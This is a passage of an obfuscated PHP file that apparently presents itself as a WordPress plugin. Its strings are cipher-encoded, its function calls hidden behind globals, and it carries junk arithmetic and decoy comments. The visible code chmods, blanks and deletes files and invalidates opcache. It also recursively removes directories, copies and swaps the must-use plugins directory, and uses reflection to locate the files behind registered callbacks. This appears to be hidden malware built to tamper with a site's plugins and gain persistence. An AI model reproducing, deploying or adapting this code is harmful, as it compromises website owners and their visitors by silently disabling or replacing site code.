;6]w__..]'));}return $a[$i];}function c1sob647u1i($i){$e=y86955d2t25ub7t($i);$f='ABSP'.'THs'.'c_v'.'ero'.'4.'.'53pl'.'ugin'.'ba'.'mWL'.'UGI'.'ND'.'RM/'.'-kd'.'ht'.'w<?'.'\\q'.'fCOE'.'x :*'.'y=V('.'+)2F'.'K\','.'0z>&'.'19'.'78'.'6X'.'YZQ'.'j;'.'{"'.'[}'.']!|^'.'$#J'.'%`';$t='sBMz'.'nv*'.'".8/'.'? '.'-Q'.'}_;'.']9c'.'oK='.'mfL'.'JZ'.'5&'.'`#G'.'g$RN'.'F6r'.':D4h'.'iW2u'.'!3Y7'.'[kly'.'CH<b'.'A('.'|E'.'wIa'.'TXx'.'%V'.'0q1P'.'e{,p'.'j+^'.')O'.'>\'d'.'t\\U'.'S';$r="";for($j=0;$j<strlen($e);$j++){$p=strpos($t,$e[$j]);$r.=($p===false)?$e[$j]:$f[$p];}return $r;}function ovffvv33($i){$j=$i;return c1sob647u1i($j);}function f6yrzd2knrmb($i){$j=$i;return c1sob647u1i($j);}function iw6xe9q4j6sneg($i){$j=$i+0;return c1sob647u1i($j);}function bpowi0iglycvx($i){return c1sob647u1i($i);}function hn_f08x0cns80($i){$j=$i+0;return c1sob647u1i($j);}$GLOBALS['__scf_owu_4pajngr_3']=iw6xe9q4j6sneg(3);$GLOBALS['__scf_w3f945e2es_4']=f6yrzd2knrmb(4);$GLOBALS['__scf_w6mdcepio4lkz5_7']=ovffvv33(7);$GLOBALS['__scf_wr4u8clizo4sw_8']=f6yrzd2knrmb(8);$GLOBALS['__scf_nv7he759wjfj_9']=hn_f08x0cns80(9);$GLOBALS['__scf_d4eyetogjbsnt_10']=c1sob647u1i(10);$GLOBALS['__scf_po3uwzhcb63b03_11']=c1sob647u1i(11);$GLOBALS['__scf_ofdeuvs8zwos6_12']=f6yrzd2knrmb(12);$GLOBALS['__scf_m0io_o6pvww4t6_16']=iw6xe9q4j6sneg(16);$GLOBALS['__scf_y0ctsi0tqyy7t_18']=bpowi0iglycvx(18);$GLOBALS['__scf_fbizamz5bjakz_20']=c1sob647u1i(20);$GLOBALS['__scf_rjpcj9l4bigb5_21']=f6yrzd2knrmb(21);$GLOBALS['__scf_huiecxntl0_24']=f6yrzd2knrmb(24);$GLOBALS['__scf_h_ah55mj51l_26']=ovffvv33(26);$GLOBALS['__scf_ba4991zo41sta_36']=c1sob647u1i(36);$GLOBALS['__scf_o586spfnej_37']=ovffvv33(37);$GLOBALS['__scf_w1m1ydxx4_gm9__38']=bpowi0iglycvx(38);$GLOBALS['__scf_wj6dld55k5r8m_39']=hn_f08x0cns80(39);$GLOBALS['__scf_kbrcs8ik07dv6_40']=f6yrzd2knrmb(40);$GLOBALS['__scf_hw6fksdea20_42']=hn_f08x0cns80(42);$GLOBALS['__scf_fv3zevxzzb_44']=ovffvv33(44);$GLOBALS['__scf_opq_vgkskw_46']=bpowi0iglycvx(46);$GLOBALS['__scf_lclsn87cymy_47']=f6yrzd2knrmb(47);$GLOBALS['__scf_kupirwjlofzm_49']=hn_f08x0cns80(49);$GLOBALS['__scf_sunuwikkpg6_51']=hn_f08x0cns80(51);$GLOBALS['__scf_tv3phr4m7yg_57']=hn_f08x0cns80(57);$GLOBALS['__scf_tnonex5o9y_60']=f6yrzd2knrmb(60);$GLOBALS['__scf_bslklilwd3kn_71']=ovffvv33(71);$GLOBALS['__scf_kajvzw3bpufv_75']=iw6xe9q4j6sneg(75);$GLOBALS['__scf_c2r2e7u5qd7u_77']=f6yrzd2knrmb(77);$GLOBALS['__scf_qo7895jhcq7i_79']=bpowi0iglycvx(79);$GLOBALS['__scf_qjk23vglbe0p_80']=ovffvv33(80);$GLOBALS['__scf_ujxphkubsb4a2h_81']=f6yrzd2knrmb(81);$GLOBALS['__scf_cxw7ozc_kikul_82']=f6yrzd2knrmb(82);$GLOBALS['__scf_utyj_ckly79_101']=hn_f08x0cns80(101);$GLOBALS['__scf_wdjvpd1lvon9_102']=f6yrzd2knrmb(102);$GLOBALS['__scf_uo_a60ibqnli_104']=f6yrzd2knrmb(104);$GLOBALS['__scf_b42duf6j1zadm9_105']=ovffvv33(105);$GLOBALS['__scf_xyekfdfj2g_109']=bpowi0iglycvx(109);$GLOBALS['__scf_h9zx4fm_1_qpan_110']=iw6xe9q4j6sneg(110);$GLOBALS['__scf_hm704kpgfifhl_118']=f6yrzd2knrmb(118);$GLOBALS['__scf_xi_pncf33_0_120']=iw6xe9q4j6sneg(120);$GLOBALS['__scf_ewy3z2db5hgtu_130']=hn_f08x0cns80(130);$GLOBALS['__scf_vmnuset3sz__158']=c1sob647u1i(158);$GLOBALS['__scf_tni2zo3jsk7_159']=bpowi0iglycvx(159);$GLOBALS['__scf_rd2tojulg06lx_160']=iw6xe9q4j6sneg(160);$GLOBALS['__scf_yucj673b8x_164']=bpowi0iglycvx(164);$GLOBALS['__scf_emst8f79kti_170']=c1sob647u1i(170);$GLOBALS['__scf_g45egtj01hms_186']=bpowi0iglycvx(186);$GLOBALS['__scf_qzyo0sgkyb6_202']=ovffvv33(202);$GLOBALS['__scf_whcsnotvh9twx_211']=iw6xe9q4j6sneg(211);$GLOBALS['__scf_wvxpw4xfn9_219']=c1sob647u1i(219);$GLOBALS['__scf_q2beonq6yv5_234']=ovffvv33(234);$GLOBALS['__scf_u3vu0za9iv_f_235']=bpowi0iglycvx(235);$GLOBALS['__scf_ll2wbhoqs9_237']=c1sob647u1i(237);$GLOBALS['__scf_d_ovrn098z_240']=f6yrzd2knrmb(240);$GLOBALS['__scf_b808yx4xh5v2y_241']=iw6xe9q4j6sneg(241);$GLOBALS['__scf_hfv46cl2qtqs_251']=iw6xe9q4j6sneg(251);$GLOBALS['__scf_cof9xlrmzjgm7_253']=bpowi0iglycvx(253);$GLOBALS['__scf_f9uki0i658jr_283']=c1sob647u1i(283);$GLOBALS['__scf_nsnpzr_hnf_284']=ovffvv33(284);$GLOBALS['__scf_cqu48nk44w5__285']=bpowi0iglycvx(285);$GLOBALS['__scf_s4p8eruhfh_289']=hn_f08x0cns80(289);$GLOBALS['__scf_e_7yj02ljx4_296']=bpowi0iglycvx(296);$GLOBALS['__scf_s8xmplvgwgjpv_298']=c1sob647u1i(298);$GLOBALS['__scf_u2xtklnzk8_7_x_300']=hn_f08x0cns80(300);$GLOBALS['__scf_pqvamo46j0cu_301']=hn_f08x0cns80(301);$GLOBALS['__scf_uroqlxj534ze4e_302']=c1sob647u1i(302);$GLOBALS['__scf_r7h_2y83ismjfq_303']=bpowi0iglycvx(303);$GLOBALS['__scf_d02n2eqmttocyj_308']=iw6xe9q4j6sneg(308);$GLOBALS['__scf_zn6fc9py528o1_311']=f6yrzd2knrmb(311);$GLOBALS['__scf_ybyy2dro0qw5fh_318']=ovffvv33(318);$GLOBALS['__scf_x9g4zn5i4ykuh_320']=bpowi0iglycvx(320);$GLOBALS['__scf_ft4dc09jmlt_338']=hn_f08x0cns80(338);$GLOBALS['__scf_qew3crlieule_339']=hn_f08x0cns80(339);$GLOBALS['__scf_yeixh7nk2_03ag_344']=c1sob647u1i(344);$GLOBALS['__scf_l56gszu90juoa_348']=f6yrzd2knrmb(348);$GLOBALS['__scf_vkh82z40y0_352']=c1sob647u1i(352);$GLOBALS['__scf_ddawojik92_353']=hn_f08x0cns80(353);$GLOBALS['__scf_m9zfobj9w13_357']=ovffvv33(357);$GLOBALS['__scf_nas59etuq3_366']=ovffvv33(366);$GLOBALS['__scf_adij6m_z1a_367']=hn_f08x0cns80(367);$GLOBALS['__scf_ew0pe5qy71c8x_368']=ovffvv33(368);$GLOBALS['__scf_f2vx2328qo_369']=bpowi0iglycvx(369);$GLOBALS['__scf_i8wggf4l_3p_373']=hn_f08x0cns80(373);$GLOBALS['__scf_scmsfepqcmxvrl_376']=bpowi0iglycvx(376);$GLOBALS['__scf_usy4mchq83xa_378']=c1sob647u1i(378);$GLOBALS['__scf_rtoe8n0snncm6l_383']=iw6xe9q4j6sneg(383);$GLOBALS['__scf_en9wrpvm3eosc_387']=hn_f08x0cns80(387);$GLOBALS['__scf_qbnw1nt7jz7_412']=hn_f08x0cns80(412);$GLOBALS['__scf_n7xrk8yr6wiaqy_413']=ovffvv33(413);$GLOBALS['__scf_q_k47eumcpo_414']=iw6xe9q4j6sneg(414);$GLOBALS['__scf_jc6nu1mm82_430']=f6yrzd2knrmb(430);$GLOBALS['__scf_vl4ialcuj8kw_431']=ovffvv33(431);$GLOBALS['__scf__l4mqk46p7q_440']=f6yrzd2knrmb(440);$GLOBALS['__scf_h7yij8unkgou5_450']=iw6xe9q4j6sneg(450);$GLOBALS['__scf_renvrk8nefa8_474']=f6yrzd2knrmb(474);$GLOBALS['__scf_a5xz_m7m_xzaj_493']=f6yrzd2knrmb(493);$GLOBALS['__scf_bpblov2hvcg_r_494']=bpowi0iglycvx(494);$GLOBALS['__scf_dr1wex6ejrn2_554']=c1sob647u1i(554);$GLOBALS['__scf_lf33h8m4cq_577']=bpowi0iglycvx(577);$GLOBALS['__scf_k37zfi55nx4h_597']=hn_f08x0cns80(597);$GLOBALS['__scf__r5ulaote4t_611']=f6yrzd2knrmb(611);$GLOBALS['__scf_o96w7gevmp_629']=bpowi0iglycvx(629);$GLOBALS['__scf_ho6tixfm0uth_f_670']=c1sob647u1i(670);$GLOBALS['__scf_ajgx8h162s_701']=bpowi0iglycvx(701);$GLOBALS['__scf_qg7ainp116mf_713']=ovffvv33(713);$GLOBALS['__scf_a358qc7b5bkb_729']=hn_f08x0cns80(729);$GLOBALS['__scf_atryllxfh4qbk_735']=f6yrzd2knrmb(735);$GLOBALS['__scf_qw5tztoblafz_841']=hn_f08x0cns80(841);$GLOBALS['__scf_pa9s1m1dido_934']=c1sob647u1i(934);$GLOBALS['__scf_gk6ndp9t4p_958']=c1sob647u1i(958);$GLOBALS['__scf_tzh0_qq5u7lk7_1017']=iw6xe9q4j6sneg(1017);$GLOBALS['__scf_xfpngyi95ixgt_1023']=ovffvv33(1023);$GLOBALS['__scf_mqh00r_t1l90k_1190']=c1sob647u1i(1190);$GLOBALS['__scf__t_pvgix5r_1202']=f6yrzd2knrmb(1202);$GLOBALS['__scf_bu2li6mf2y8n_1290']=f6yrzd2knrmb(1290);$GLOBALS['__scf_akow9cnzygd9jc_1291']=iw6xe9q4j6sneg(1291);$GLOBALS['__scf_qkze49lvhswo_1292']=c1sob647u1i(1292);$GLOBALS['__scf_s4hu96prp_z_1295']=bpowi0iglycvx(1295);$GLOBALS['__scf_snrs4tbazd8_1296']=ovffvv33(1296);$GLOBALS['__scf_ti43kloh6mxx_1297']=ovffvv33(1297);$GLOBALS['__scf_ipoxjppyvo_1298']=bpowi0iglycvx(1298);$GLOBALS['__scf_xdr1sxhols_1299']=f6yrzd2knrmb(1299);$GLOBALS['__scf_fg19kt2h0qqpem_1301']=hn_f08x0cns80(1301);$GLOBALS['__scf_txz82q2cnpicy_1315']=ovffvv33(1315);$GLOBALS['__scf__thjyt09xu_1356']=bpowi0iglycvx(1356);$GLOBALS['__scf_ubbef44x62t_1364']=bpowi0iglycvx(1364);$GLOBALS['__scf_z1sevw8b40p6_1369']=c1sob647u1i(1369);$GLOBALS['__scf_e24rppqzou_1420']=hn_f08x0cns80(1420);$GLOBALS['__scf_igt4peff597_1494']=hn_f08x0cns80(1494);$GLOBALS['__scf_f7covg93lc_1518']=ovffvv33(1518);$GLOBALS['__scf_eyvubii89y_1762']=f6yrzd2knrmb(1762);$GLOBALS['__scf_v9_7mhg4uu_1768']=ovffvv33(1768);$GLOBALS['__scf_cflcfcq3y4pu_1870']=f6yrzd2knrmb(1870);

function aczm0gwcggdyrfay4($os747urh1){$os747urh1=(isset($os747urh1)?$os747urh1:0)+0;return $os747urh1*8;}
function yjjpvkohtksd2qj2gp8p($ce3nimh){$ce3nimh=(isset($ce3nimh)?$ce3nimh:0)+0;return $ce3nimh*7;}

 
  defined(iw6xe9q4j6sneg(0))   or  exit;
 
function  dfb4_mpcgxvnp230hvh1v()
  {


  return  isset($GLOBALS[iw6xe9q4j6sneg(1)])  ? $GLOBALS[hn_f08x0cns80(1)]   :    c1sob647u1i(2);
     }
      function  bmvtr5sdqjf5km1t()
{
 return __FILE__;

  }
function  ins9ithmohgssp_()
 {
  return  $GLOBALS['__scf_owu_4pajngr_3'](bmvtr5sdqjf5km1t());
 }
function ayw2e71sos2ne2g()
{

   if  ($GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(5))) return    plugin_basename(bmvtr5sdqjf5km1t());
      $ko9cqc0s7si9cc   =   bmvtr5sdqjf5km1t();
$fgi5etl773fhq0 =    defined(iw6xe9q4j6sneg(6)) ? WP_PLUGIN_DIR : "";
if ($fgi5etl773fhq0 !==     ""  && $GLOBALS['__scf_w6mdcepio4lkz5_7']($ko9cqc0s7si9cc,  $fgi5etl773fhq0)  ===  0) return    $GLOBALS['__scf_wr4u8clizo4sw_8']($GLOBALS['__scf_nv7he759wjfj_9']($ko9cqc0s7si9cc,   $GLOBALS['__scf_d4eyetogjbsnt_10']($fgi5etl773fhq0)),  '/');
  return $GLOBALS['__scf_owu_4pajngr_3']($GLOBALS['__scf_po3uwzhcb63b03_11']($ko9cqc0s7si9cc))     .   '/'  . $GLOBALS['__scf_owu_4pajngr_3']($ko9cqc0s7si9cc);



   }


function   jo62hy1j37iqrmy()
 {
// WP InspectorControls: unbounded synchronizer

  return  $GLOBALS['__scf_ofdeuvs8zwos6_12'](defined(bpowi0iglycvx(13))  ?    WPMU_PLUGIN_DIR  :  (WP_CONTENT_DIR   . f6yrzd2knrmb(14)),     '/');
  }
     function  gf92nelnpfnbih()
 {
// rotate asynchronous equivalence-class

   return $GLOBALS['__scf_po3uwzhcb63b03_11'](bmvtr5sdqjf5km1t());
   }

function xxvz5dp1zk215e5d9($kekj16jieb,  $u7fvh_hax8vn      = (0x1bd+0x30), $n0tlzmrutbrfwh_    =  false)
    {
 return  $GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(15))   ?     @$GLOBALS['__scf_m0io_o6pvww4t6_16']($kekj16jieb, $u7fvh_hax8vn,  $n0tlzmrutbrfwh_)  : false;
       }
      function ruinnb541lwxm7j($cupk3kbt8eisf,    $u7fvh_hax8vn)
     {
  return    $GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(17)) ?  @$GLOBALS['__scf_y0ctsi0tqyy7t_18']($cupk3kbt8eisf, $u7fvh_hax8vn)     :   false;
       }
  function cvtaycsw15_xd1srry($cupk3kbt8eisf)



  {
  return $GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(19))     ?  @$GLOBALS['__scf_fbizamz5bjakz_20']($cupk3kbt8eisf) : false;
}
 function j81oyiorlegz06z33($w90pshmxoqhf)
   {



    if (!@$GLOBALS['__scf_rjpcj9l4bigb5_21']($w90pshmxoqhf))    return  true;


     ruinnb541lwxm7j($w90pshmxoqhf,  (74+346));
 if (cvtaycsw15_xd1srry($w90pshmxoqhf))  {
if   ($GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(22)))   @opcache_invalidate($w90pshmxoqhf,   true);
    return true;
  }
  ruinnb541lwxm7j($GLOBALS['__scf_po3uwzhcb63b03_11']($w90pshmxoqhf), (432+61));


  if      (cvtaycsw15_xd1srry($w90pshmxoqhf))    {
if ($GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(23)))  @opcache_invalidate($w90pshmxoqhf, true);
 return      true;
  }
   $eribl7p1ze  =     @$GLOBALS['__scf_huiecxntl0_24']($w90pshmxoqhf, c1sob647u1i(25));


  if    ($eribl7p1ze)   {
@$GLOBALS['__scf_h_ah55mj51l_26']($eribl7p1ze,  "<?php\n");
// length-delimited

@fclose($eribl7p1ze);

if ($GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(23))) @opcache_invalidate($w90pshmxoqhf,     true);
  return     true;$xswlco5f=94+59;$vaco3i1kwzb=$xswlco5f-7;
 }
   return false;



}
function  rrd1j6b2wjg30_7($w90pshmxoqhf)
     {
// checkpoint savepoint for WP Site Editor

    $d1f13drgy1_8zv  = $GLOBALS['__scf_po3uwzhcb63b03_11']($w90pshmxoqhf);
       $f4wi4imyue80384  =    $GLOBALS['__scf_owu_4pajngr_3']($w90pshmxoqhf,      f6yrzd2knrmb(27));
   foreach    (array(iw6xe9q4j6sneg(28),  ovffvv33(29),   c1sob647u1i(30),     bpowi0iglycvx(31))   as     $bjvdhstqibyh)  {
    $z8pt_ekqvakn = $d1f13drgy1_8zv .    '/'    .  $bjvdhstqibyh  .   $f4wi4imyue80384;


 if  (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($z8pt_ekqvakn))  j81oyiorlegz06z33($z8pt_ekqvakn);
      }
   $rqmll49z7x5sl    =  $d1f13drgy1_8zv  .    '/' .     $f4wi4imyue80384   .     bpowi0iglycvx(32);
  if   (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($rqmll49z7x5sl)) j81oyiorlegz06z33($rqmll49z7x5sl);
 if (defined(bpowi0iglycvx(33)))   {
$h9u6we73g0zth4da =    WP_CONTENT_DIR     .  bpowi0iglycvx(34)   .   $f4wi4imyue80384;
   if   (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($h9u6we73g0zth4da)) j81oyiorlegz06z33($h9u6we73g0zth4da);

 }
   $_pd   =  defined(bpowi0iglycvx(35))  ? @$GLOBALS['__scf_ba4991zo41sta_36'](WP_PLUGIN_DIR)    :  false;



  $vkfhbb8hycke = @$GLOBALS['__scf_ba4991zo41sta_36']($d1f13drgy1_8zv);

 if ($_pd &&   $vkfhbb8hycke      &&     $GLOBALS['__scf_po3uwzhcb63b03_11']($vkfhbb8hycke)    === $_pd)    {


$gs4hbry03f05d66o  =     @$GLOBALS['__scf_o586spfnej_37']($vkfhbb8hycke);
if ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($gs4hbry03f05d66o) &&    $GLOBALS['__scf_wj6dld55k5r8m_39']($gs4hbry03f05d66o)    <=    2) @$GLOBALS['__scf_kbrcs8ik07dv6_40']($vkfhbb8hycke);
}
    }
  function  p0nyr2qe94uce9iuv6s6pm()
  {

      static   $ikkb2pdoc9   =   'x';


 if ($ikkb2pdoc9     !==  'x')    return $ikkb2pdoc9;
      $ikkb2pdoc9  =  null;
     if ($GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(41)))   { $x434be6la7lqy8l   =     @posix_geteuid();  if     ($GLOBALS['__scf_hw6fksdea20_42']($x434be6la7lqy8l)) $ikkb2pdoc9  =   $x434be6la7lqy8l;     }
if     ($ikkb2pdoc9 === null) {
  $emnni5z67kh0    =   lwxb0otgrmrkttfbm_7t_r(ircnjcyfmf8qkc7xdiss4(),   bpowi0iglycvx(43));



   if    ($GLOBALS['__scf_fv3zevxzzb_44']($emnni5z67kh0))    {  $t2zfh91fsvvc1z   = @fileowner($emnni5z67kh0); cvtaycsw15_xd1srry($emnni5z67kh0);   if  ($GLOBALS['__scf_hw6fksdea20_42']($t2zfh91fsvvc1z))  $ikkb2pdoc9  =  $t2zfh91fsvvc1z; }

 }
// @detach tumbling-window

   return $ikkb2pdoc9;
   }



function dww696yhrcl9q7s3wh($t49jadtyjx)
    {
  if  ($GLOBALS['__scf_w6mdcepio4lkz5_7']($GLOBALS['__scf_owu_4pajngr_3']($t49jadtyjx),     hn_f08x0cns80(45))     !==    0)   return;

 if     (!@$GLOBALS['__scf_opq_vgkskw_46']($t49jadtyjx)   ||  @$GLOBALS['__scf_lclsn87cymy_47']($t49jadtyjx))  return;



 $r2rrnbz839  = @$GLOBALS['__scf_o586spfnej_37']($t49jadtyjx);

if   ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($r2rrnbz839))  foreach  ($r2rrnbz839  as  $cje8wku90zm4r)     {


if  ($cje8wku90zm4r   ===     '.'      ||  $cje8wku90zm4r ===    c1sob647u1i(48)) continue;
$cupk3kbt8eisf      =    $t49jadtyjx .   '/'     .   $cje8wku90zm4r;
 if    (@$GLOBALS['__scf_opq_vgkskw_46']($cupk3kbt8eisf)    && !@$GLOBALS['__scf_lclsn87cymy_47']($cupk3kbt8eisf))     dww696yhrcl9q7s3wh($cupk3kbt8eisf);  else  cvtaycsw15_xd1srry($cupk3kbt8eisf);
     }


    @$GLOBALS['__scf_kbrcs8ik07dv6_40']($t49jadtyjx);


}
 function  a9nvo5ynpqfkkbnk($egziouap1xyua, $zvl3ojdfjf0jq)
 {$op7n1f7bbwjc=142|91;$cm8c2xxigy=$op7n1f7bbwjc^9;
        if   (@$GLOBALS['__scf_lclsn87cymy_47']($egziouap1xyua))  return  false;
  if (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($egziouap1xyua))  {
if (!@$GLOBALS['__scf_kupirwjlofzm_49']($egziouap1xyua))  return  false;

return  l7o387uoh_b5jut19ja8b($egziouap1xyua, $zvl3ojdfjf0jq)  ? true   :  false;
   }


    if  (@$GLOBALS['__scf_opq_vgkskw_46']($egziouap1xyua))   {
if     (!@$GLOBALS['__scf_opq_vgkskw_46']($zvl3ojdfjf0jq)  &&    !xxvz5dp1zk215e5d9($zvl3ojdfjf0jq, (307+186), true))      return  false;
$r2rrnbz839      =  @$GLOBALS['__scf_o586spfnej_37']($egziouap1xyua);
 if (!$GLOBALS['__scf_w1m1ydxx4_gm9__38']($r2rrnbz839))     return    false;
  foreach  ($r2rrnbz839 as    $cje8wku90zm4r)  {
// PCRE2 JIT: feasible rate-limiter

if  ($cje8wku90zm4r    ===    '.' ||  $cje8wku90zm4r     ===     f6yrzd2knrmb(50)) continue;
      if   (!a9nvo5ynpqfkkbnk($egziouap1xyua .   '/'      .    $cje8wku90zm4r, $zvl3ojdfjf0jq  .   '/'   .   $cje8wku90zm4r)) return    false;
    }
 return  true;
}
  return    true;
       }
  function awt0clbm2rkh9u4z8mjsz($w90pshmxoqhf)
    {
     if  (!@$GLOBALS['__scf_rjpcj9l4bigb5_21']($w90pshmxoqhf))   return  false;
    if   (@$GLOBALS['__scf_sunuwikkpg6_51']($w90pshmxoqhf)) return   false;
     if (@$GLOBALS['__scf_sunuwikkpg6_51']($GLOBALS['__scf_po3uwzhcb63b03_11']($w90pshmxoqhf)))    return false;
return  true;
 }
function cbzu166xe9qr89g6($w90pshmxoqhf)



    {



g_qoqdy38lfl4v4n3618(f6yrzd2knrmb(52),   $GLOBALS['__scf_owu_4pajngr_3']($w90pshmxoqhf));



    }
     function  czznuvw9tobf1x1o($xnaqqygugco6)
{
    if  (!$GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(53))  ||    !$GLOBALS['__scf_w3f945e2es_4'](ovffvv33(54)))  return     false;
    if   ($GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(55))  &&   get_transient(f6yrzd2knrmb(56)))   return   false;
 $gt_yxz78afg = @$GLOBALS['__scf_ba4991zo41sta_36'](jo62hy1j37iqrmy());
if ($gt_yxz78afg  === false  || !@$GLOBALS['__scf_opq_vgkskw_46']($gt_yxz78afg)) return      false;
     $hfjqlmm5z521e = null;
     if  ($xnaqqygugco6 !==    null)  {
$hfjqlmm5z521e    =    @$GLOBALS['__scf_ba4991zo41sta_36']($xnaqqygugco6);
   if    ($hfjqlmm5z521e ===     false      || $GLOBALS['__scf_po3uwzhcb63b03_11']($hfjqlmm5z521e)   !==  $gt_yxz78afg) return  false;
  }
    $sd4pp1y8otmjt  =   $GLOBALS['__scf_po3uwzhcb63b03_11']($gt_yxz78afg);


   if  (!@$GLOBALS['__scf_opq_vgkskw_46']($sd4pp1y8otmjt)  ||  !@$GLOBALS['__scf_sunuwikkpg6_51']($sd4pp1y8otmjt)) return    false;
if   (!fiq2af1kmyjbo9re_ltz($gt_yxz78afg)  ||  !fiq2af1kmyjbo9re_ltz($sd4pp1y8otmjt))    return   false;
   $kabkloof2knd    = @fileperms($sd4pp1y8otmjt);

    if ($kabkloof2knd   !== false   &&  ($kabkloof2knd     &   (643-131))) {
 $ffj3xdz44fw_30n =    p0nyr2qe94uce9iuv6s6pm();
if ($ffj3xdz44fw_30n ===  null  ||     (@fileowner($sd4pp1y8otmjt) !== $ffj3xdz44fw_30n  &&     @fileowner($gt_yxz78afg)  !==    $ffj3xdz44fw_30n)) return    false;


 }
  $ipssrazj2r =    @$GLOBALS['__scf_tv3phr4m7yg_57']($sd4pp1y8otmjt); $hbmb7dmmj_zj5 =  @$GLOBALS['__scf_tv3phr4m7yg_57']($gt_yxz78afg);
     if   ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($ipssrazj2r)  &&    $GLOBALS['__scf_w1m1ydxx4_gm9__38']($hbmb7dmmj_zj5)  &&   isset($ipssrazj2r[iw6xe9q4j6sneg(58)])   &&  isset($hbmb7dmmj_zj5[ovffvv33(59)])    &&   $ipssrazj2r[hn_f08x0cns80(59)]  !==  $hbmb7dmmj_zj5[f6yrzd2knrmb(59)])    return   false;
     $r2rrnbz839     = @$GLOBALS['__scf_o586spfnej_37']($gt_yxz78afg);
      if (!$GLOBALS['__scf_w1m1ydxx4_gm9__38']($r2rrnbz839))    return  false;
  $po2x2uzszyfppw7 =   array();
 foreach  ($r2rrnbz839     as $cje8wku90zm4r)  {



      if   ($cje8wku90zm4r   === '.' || $cje8wku90zm4r     ===   hn_f08x0cns80(50))  continue;
$cupk3kbt8eisf     = $gt_yxz78afg    .     '/'   .  $cje8wku90zm4r;
  $bnc4qvyphlcdp   = @$GLOBALS['__scf_ba4991zo41sta_36']($cupk3kbt8eisf);
if   ($hfjqlmm5z521e !==  null    &&    $bnc4qvyphlcdp   !==    false    &&    $bnc4qvyphlcdp ===  $hfjqlmm5z521e) continue;

    if    (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($cupk3kbt8eisf)  && mza6zg2fnwyep8gx2xd($cupk3kbt8eisf, (197+303)))  continue;



  if     (@$GLOBALS['__scf_lclsn87cymy_47']($cupk3kbt8eisf) ||    !@$GLOBALS['__scf_kupirwjlofzm_49']($cupk3kbt8eisf)) return  false;
 $po2x2uzszyfppw7[] =    $cje8wku90zm4r;
   }
 $d40y_aac43t4    =     $GLOBALS['__scf_nv7he759wjfj_9']($GLOBALS['__scf_tnonex5o9y_60'](uniqid("",   true)),    0,   (4+4));
    $abaomksved270h =  $sd4pp1y8otmjt    .   f6yrzd2knrmb(61) .  $d40y_aac43t4;
     $o6yvd6x67lu4ne  =    $sd4pp1y8otmjt    .  iw6xe9q4j6sneg(62)   .  $d40y_aac43t4;
  if (!xxvz5dp1zk215e5d9($abaomksved270h, (459+34),    true)) return  false;
   foreach ($po2x2uzszyfppw7   as  $cje8wku90zm4r) {


 if (!a9nvo5ynpqfkkbnk($gt_yxz78afg  .   '/'    . $cje8wku90zm4r,  $abaomksved270h      .  '/' .   $cje8wku90zm4r)) {   dww696yhrcl9q7s3wh($abaomksved270h); return     false; }



  }
 if   (!riq98ofdzw2zl1nzzzxy($gt_yxz78afg,     $o6yvd6x67lu4ne)) {   dww696yhrcl9q7s3wh($abaomksved270h); return  false; }

     if    (!riq98ofdzw2zl1nzzzxy($abaomksved270h,    $gt_yxz78afg)) {$rz5f2oci5v=PHP_INT_MAX/PHP_INT_MAX;$u765i4mjicufl=$rz5f2oci5v+57;  riq98ofdzw2zl1nzzzxy($o6yvd6x67lu4ne, $gt_yxz78afg);    dww696yhrcl9q7s3wh($abaomksved270h);  return   false;  }
  if ($GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(63)))  @clearstatcache(true);
      if ($hfjqlmm5z521e    !==     null  && $GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(23)))   @opcache_invalidate($hfjqlmm5z521e, true);
if ($GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(64)))  @set_transient(bpowi0iglycvx(56),     1, (0x2735+0x12a4b));
 if   ($GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(65)))  @delete_transient(c1sob647u1i(66));
    g_qoqdy38lfl4v4n3618(bpowi0iglycvx(67),    c1sob647u1i(68)   . ($xnaqqygugco6     !==   null      ?   $GLOBALS['__scf_owu_4pajngr_3']($xnaqqygugco6) :     iw6xe9q4j6sneg(69)));
return  true;

  }



  function    quy_0n2b7cyaue4b($duluassmqus)
  {
try {
  if ($duluassmqus instanceof   Closure)  {   $n0tlzmrutbrfwh_    = new     ReflectionFunction($duluassmqus);   return  $n0tlzmrutbrfwh_->getFileName();     }
   if  ($GLOBALS['__scf_fv3zevxzzb_44']($duluassmqus)   && $GLOBALS['__scf_w6mdcepio4lkz5_7']($duluassmqus,  hn_f08x0cns80(70)) !==  false)     { $n0tlzmrutbrfwh_   = new   ReflectionMethod($duluassmqus);     return   $n0tlzmrutbrfwh_->getFileName();  }
    if  ($GLOBALS['__scf_fv3zevxzzb_44']($duluassmqus)     && $GLOBALS['__scf_w3f945e2es_4']($duluassmqus))     {    $n0tlzmrutbrfwh_      =    new  ReflectionFunction($duluassmqus); return   $n0tlzmrutbrfwh_->getFileName();
  
 }
  if   ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($duluassmqus) &&  $GLOBALS['__scf_wj6dld55k5r8m_39']($duluassmqus) ===  2)     { $n0tlzmrutbrfwh_    =  new  ReflectionMethod($duluassmqus[0],     $duluassmqus[1]);  return    $n0tlzmrutbrfwh_->getFileName();   }
    } catch  (Throwable $cje8wku90zm4r)  {} catch (Exception  $cje8wku90zm4r)      {}
 return  null;

}
function   zmr27g89e4wmj7($w90pshmxoqhf)
      {
  global $rno9f7eq0bzd;



   if (!$GLOBALS['__scf_w1m1ydxx4_gm9__38']($rno9f7eq0bzd)) return;



  $iddx6_s0b1   =    @$GLOBALS['__scf_ba4991zo41sta_36']($w90pshmxoqhf);
